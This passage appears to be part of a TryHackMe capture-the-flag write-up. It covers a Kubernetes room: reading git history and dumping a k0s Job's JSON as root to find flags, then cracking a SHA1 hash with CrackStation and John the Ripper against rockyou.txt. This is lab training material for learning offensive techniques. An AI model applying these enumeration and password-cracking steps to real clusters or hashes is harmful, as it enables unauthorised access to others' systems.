+Just a warning for you this Christmas. If a fat man in a red suit comes to pick you up, know that it’s because you’re on my wish list.
\ No newline at end of file
diff --git a/king.jokes b/king.jokes
deleted file mode 100644
index 1b7d703..0000000
--- a/king.jokes
+++ /dev/null
@@ -1 +0,0 @@

root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git show 4b2c2d74b31d922252368c112a3907c5c1cf1ba3
commit 4b2c2d74b31d922252368c112a3907c5c1cf1ba3
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:37:13 2022 +0545

    feat: add cold.joke

diff --git a/king.jokes b/king.jokes
new file mode 100644
index 0000000..1b7d703
--- /dev/null
+++ b/king.jokes
@@ -0,0 +1 @@
+THM{this_joke_is_cold_joke}
\ No newline at end of file


```

What is the Pod flag?

*THM{this_joke_is_cold_joke}*

###  Hack a Job at FANG

You have been shortlisted and you have upcoming interview rounds for a FANG company! Find the secret that has been left behind.

---

I hope you have learned a lot through the challenges. Thank you so much for doing my first room and I want to personally thank [kiransau](https://tryhackme.com/p/kiransau). Feel free to provide feedback via [Twitter](https://twitter.com/pylang2).

Answer the questions below

```
https://kubernetes.io/docs/concepts/workloads/controllers/job/

root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# k0s kubectl get pods -A
NAMESPACE     NAME                              READY   STATUS      RESTARTS   AGE
internship    internship-job-5drbm              0/1     Completed   0          332d
kube-system   kube-router-vsq85                 1/1     Running     0          332d
kube-system   metrics-server-74c967d8d4-pvv8l   1/1     Running     0          332d
kube-system   kube-api                          1/1     Running     0          332d
kube-system   coredns-6d9f49dcbb-9vbff          1/1     Running     0          332d
kube-system   kube-proxy-jws4q                  1/1     Running     0          332d

root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# k0s kubectl get jobs --namespace=internship -o json
{
    "apiVersion": "v1",
    "items": [
        {
            "apiVersion": "batch/v1",
            "kind": "Job",
            "metadata": {
                "annotations": {
                    "batch.kubernetes.io/job-tracking": ""
                },
                "creationTimestamp": "2022-02-10T18:55:33Z",
                "generation": 1,
                "labels": {
                    "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d",
                    "job-name": "internship-job"
                },
                "name": "internship-job",
                "namespace": "internship",
                "resourceVersion": "579",
                "uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d"
            },
            "spec": {
                "backoffLimit": 6,
                "completionMode": "NonIndexed",
                "completions": 1,
                "parallelism": 1,
                "selector": {
                    "matchLabels": {
                        "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d"
                    }
                },
                "suspend": false,
                "template": {
                    "metadata": {
                        "creationTimestamp": null,
                        "labels": {
                            "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d",
                            "job-name": "internship-job"
                        }
                    },
                    "spec": {
                        "containers": [
                            {
                                "command": [
                                    "echo",
                                    "26c3d1c068e7e01599c3612447410b5e56c779f1"
                                ],
                                "image": "busybox",
                                "imagePullPolicy": "Always",
                                "name": "internship-job",
                                "resources": {},
                                "terminationMessagePath": "/dev/termination-log",
                                "terminationMessagePolicy": "File"
                            }
                        ],
                        "dnsPolicy": "ClusterFirst",
                        "restartPolicy": "Never",
                        "schedulerName": "default-scheduler",
                        "securityContext": {},
                        "terminationGracePeriodSeconds": 30
                    }
                }
            },
            "status": {
                "completionTime": "2022-02-10T18:59:26Z",
                "conditions": [
                    {
                        "lastProbeTime": "2022-02-10T18:59:26Z",
                        "lastTransitionTime": "2022-02-10T18:59:26Z",
                        "status": "True",
                        "type": "Complete"
                    }
                ],
                "startTime": "2022-02-10T18:56:16Z",
                "succeeded": 1,
                "uncountedTerminatedPods": {}
            }
        }
    ],
    "kind": "List",
    "metadata": {
        "resourceVersion": "",
        "selfLink": ""
    }
}

root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# k0s kubectl get jobs -n internship -o json
{
    "apiVersion": "v1",
    "items": [
        {
            "apiVersion": "batch/v1",
            "kind": "Job",
            "metadata": {
                "annotations": {
                    "batch.kubernetes.io/job-tracking": ""
                },
                "creationTimestamp": "2022-02-10T18:55:33Z",
                "generation": 1,
                "labels": {
                    "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d",
                    "job-name": "internship-job"
                },
                "name": "internship-job",
                "namespace": "internship",
                "resourceVersion": "579",
                "uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d"
            },
            "spec": {
                "backoffLimit": 6,
                "completionMode": "NonIndexed",
                "completions": 1,
                "parallelism": 1,
                "selector": {
                    "matchLabels": {
                        "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d"
                    }
                },
                "suspend": false,
                "template": {
                    "metadata": {
                        "creationTimestamp": null,
                        "labels": {
                            "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d",
                            "job-name": "internship-job"
                        }
                    },
                    "spec": {
                        "containers": [
                            {
                                "command": [
                                    "echo",
                                    "26c3d1c068e7e01599c3612447410b5e56c779f1"
                                ],
                                "image": "busybox",
                                "imagePullPolicy": "Always",
                                "name": "internship-job",
                                "resources": {},
                                "terminationMessagePath": "/dev/termination-log",
                                "terminationMessagePolicy": "File"
                            }
                        ],
                        "dnsPolicy": "ClusterFirst",
                        "restartPolicy": "Never",
                        "schedulerName": "default-scheduler",
                        "securityContext": {},
                        "terminationGracePeriodSeconds": 30
                    }
                }
            },
            "status": {
                "completionTime": "2022-02-10T18:59:26Z",
                "conditions": [
                    {
                        "lastProbeTime": "2022-02-10T18:59:26Z",
                        "lastTransitionTime": "2022-02-10T18:59:26Z",
                        "status": "True",
                        "type": "Complete"
                    }
                ],
                "startTime": "2022-02-10T18:56:16Z",
                "succeeded": 1,
                "uncountedTerminatedPods": {}
            }
        }
    ],
    "kind": "List",
    "metadata": {
        "resourceVersion": "",
        "selfLink": ""
    }
}

using crackstation 26c3d1c068e7e01599c3612447410b5e56c779f1 : chidori

naruto :)

or john

┌──(kali㉿kali)-[~]
└─$ nano hash_k0s  
                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_k0s 
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
chidori          (?)     
1g 0:00:00:00 DONE (2023-01-09 12:59) 50.00g/s 556600p/s 556600c/s 556600C/s cobra..chidori
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 

```

What's the secret to the FANG interview?

*chidori*


[[0day]]